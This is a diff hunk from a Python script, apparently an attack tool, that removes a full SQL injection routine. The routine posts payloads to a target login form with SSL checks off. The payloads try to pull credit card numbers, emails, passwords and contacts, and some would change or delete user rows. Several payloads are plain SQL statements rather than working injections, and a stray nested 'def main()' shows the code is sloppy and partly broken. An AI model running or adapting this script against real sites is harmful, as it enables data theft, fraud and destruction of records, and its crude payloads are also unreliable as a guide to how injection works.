@@ -69,63 +69,7 @@ def print_header():
     """
     print(header)
 
-def check_website_status(url):
-    """Check if the website is accessible."""
-    try:
-        response = requests.get(url)
-        if response.status_code == 200:
-            print(f"The website {url} is accessible.")
-            return True
-        else:
-            print(f"The website {url} is not accessible. Status code: {response.status_code}")
-            return False
-    except requests.RequestException as e:
-        print(f"An error occurred: {e}")
-        return False
-
-def perform_sql_injection(target_url):
-    """Perform SQL Injection using the provided payloads."""
-    payloads = [
-        "' OR 1=1 UNION SELECT cc_number, cc_holder, cc_expiration FROM credit_cards --",
-        "' OR 1=1 UNION SELECT email FROM users --",
-        "' OR 1=1 UNION SELECT password FROM users --",
-        "' OR 1=1 UNION SELECT contact_name, contact_number FROM contacts --",
-        "SELECT * FROM users WHERE username='admin';",
-        "INSERT INTO users (username, password) VALUES ('newuser', 'newpassword');",
-        "UPDATE users SET password='newpassword' WHERE username='admin';",
-        "DELETE FROM users WHERE username='olduser';",
-        "SELECT * FROM products WHERE name LIKE '%user_input%';",
-        "SELECT * FROM products WHERE name LIKE '%admin%' UNION SELECT username, password FROM users;",
-        "SELECT * FROM users WHERE username='user_input' AND password='password_input';",
-        "SELECT * FROM users WHERE username='admin' AND password=' OR 1=1 -- ';",
-        "SELECT * FROM products WHERE name LIKE '%user_input%';",
-        "SELECT * FROM products WHERE name LIKE '%admin%' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1;",
-        "SELECT * FROM products WHERE name LIKE '%user_input%';",
-        "SELECT * FROM products WHERE name LIKE '%admin%' AND SLEEP(5);"
-    ]
-
-    for payload in payloads:
-        data = {
-            'username': f'admin{payload}',
-            'password': 'password'  # Update with the correct password field if needed
-        }
-
-        try:
-            response = requests.post(target_url, data=data, verify=False)  # Disabling SSL verification
-            if "error" in response.text.lower():
-                print(f"Payload: {payload} might cause an error")
-            else:
-                print(f"Payload: {payload} - Response: {response.text}")  # This will display the extracted data
-        except SSLError as e:
-            print(f"SSL Error: {e}")
-        except RequestException as e:
-            print(f"Request Error: {e}")
-
 def main():
-    # Print the header
-    print_header()
-
-    def main():
     # Print the header
     print_header()
 
